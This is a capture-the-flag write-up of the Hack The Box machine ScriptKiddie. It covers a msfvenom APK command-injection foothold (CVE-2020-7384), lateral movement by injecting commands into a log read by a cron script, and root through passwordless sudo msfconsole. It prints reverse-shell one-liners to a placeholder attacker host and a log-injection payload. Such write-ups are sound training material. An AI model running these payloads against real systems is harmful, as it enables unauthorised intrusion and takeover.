# ScriptKiddie

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **IP Address** | 10.10.10.226 |
| **Status** | Retired |

## Overview
ScriptKiddie is an Easy Linux machine that parodies a "script kiddie" toolkit web app exposing Nmap, searchsploit, and `msfvenom` payload generation over a Flask web interface. Uploading a crafted Android package name triggers **CVE-2020-7384**, a Metasploit `msfvenom` APK template command-injection vulnerability, providing an initial foothold as the `kid` user. Lateral movement to a second user (`pwn`) is achieved by injecting shell commands into a log file consumed by an unsanitized Bash script. Root is obtained via a `sudo` misconfiguration allowing `msfconsole` to run as root without a password.

## Reconnaissance
Nmap showed SSH and a Flask/Werkzeug development web server:

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
| http-title: k1d'5 h4ck3r t00l5
```

## Enumeration
The site ("k1d'5 h4ck3r t00l5") offered forms for running Nmap scans, searchsploit lookups, and generating Android APK payloads via `msfvenom`. The Metasploit/`msfvenom` version in use (bundled with an old Metasploit Framework release) is affected by **CVE-2020-7384**: the APK template used by `msfvenom` allows a filename/package-name field to be crafted such that it breaks out of the intended template and injects arbitrary shell commands when the APK is built server-side.

## Foothold
An APK build request with a malicious payload/filename (an attempt is preserved conceptually: the actual uploaded artifact `pleasework.apk` has been removed from this repository) triggered command injection during `msfvenom`'s APK generation process, yielding a reverse shell:

```
bash -i >& /dev/tcp/<attacker_ip>/1339 0>&1
```

This landed as the low-privileged `kid` user.

## Privilege Escalation
As `kid`, a script `scanlosers.sh` was found reading attacker/hacker IPs or usernames from `/home/kid/logs/hackers` and using them unsanitized in further Nmap scans run by the `pwn` user. By appending a command-injection payload as a "username" entry into the log file:

```bash
echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/1337 0>&1' #" >> hackers
```

the script executed the injected command as `pwn` the next time it processed the log (via a cron job), yielding a shell as `pwn`. From there, `sudo -l` showed `pwn` could run `msfconsole` as root without a password. Since `msfconsole` supports executing arbitrary OS commands from within its interactive console, running it via `sudo` and issuing a shell command from inside Metasploit yielded a full root shell:

```
sudo msfconsole
msf6 > irb
> system("/bin/bash")
```

## Lessons Learned
- Web front-ends that shell out to security tooling (Nmap, msfvenom, searchsploit) with user-controlled parameters are extremely prone to command injection, especially on outdated tool versions with known CVEs.
- Any script that consumes log files containing attacker-influenced values (IPs, usernames, User-Agents) must treat that data as untrusted input, not just as text for later display.
- Granting passwordless `sudo` on interactive frameworks like `msfconsole` is equivalent to unrestricted root access, since such tools can spawn arbitrary subprocesses.

## Tools & References
- **CVE-2020-7384**: Metasploit Framework `msfvenom` APK template command injection
- Bash log-injection lateral movement, `sudo`/`msfconsole` privilege escalation (GTFOBins-style)
- Omitted from repository for hygiene:
  - `pleasework.apk`: the malicious APK payload generated/used during exploitation; omitted as a binary artifact, described above.
  - `ssh_key` / `ssh_key.pub`: an attacker-generated SSH keypair used for persistence (appended to `authorized_keys`); omitted as private key material.
  - `test`: a two-line scratch file (`lul`/`lul2`) with no relevance to the attack path; removed as clutter.
